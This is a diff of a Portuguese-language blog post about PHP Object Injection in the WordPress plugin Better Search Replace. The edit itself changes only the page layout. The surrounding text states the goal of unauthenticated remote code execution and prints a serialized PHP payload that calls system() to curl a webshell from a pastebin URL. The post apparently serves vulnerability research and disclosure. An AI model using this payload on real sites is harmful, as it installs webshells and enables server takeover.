@@ -1,5 +1,5 @@
 ---
-layout: post
+layout: post-pt
 title: PHP Object Injection no Better Search Replace
 permalink: /web/php-object-injection-better-search-replace
 ---
@@ -32,7 +32,7 @@ Para facilitar a minha vida, criei o plugin ["WP Object Injection Proof of Conce
 
 Ele se resume a nessa pequena classe com o método mágico ["__wakeup"](https://www.php.net/manual/pt_BR/language.oop5.magic.php#object.wakeup). Caso deseje reproduzir em um cenário mais aproximado da realidade, recomendo que veja o [PHPGGC](https://github.com/ambionics/phpggc), pode te ajudar.
 
-Meu objetivo neste momento é fazer download de uma webshell e conseguir a RCE desautenticado. O payload abaixo fará o download de um arquivo do [pastebin](https://pastebin.com/raw/E3cNN0Zy) usando o [curl](https://curl.haxx.se/). 
+Meu objetivo neste momento é fazer download de uma webshell e conseguir a RCE desautenticado. O payload abaixo fará o download de um arquivo do [pastebin](https://pastebin.com/raw/E3cNN0Zy) usando o [curl](https://curl.haxx.se/).
 
 {% highlight php %}
 O:2:”OI”:2:{s:3:”cmd”;s:48:”curl -o ws.php https://pastebin.com/raw/E3cNN0Zy“;s:3:”fcn”;s:6:”system”;}
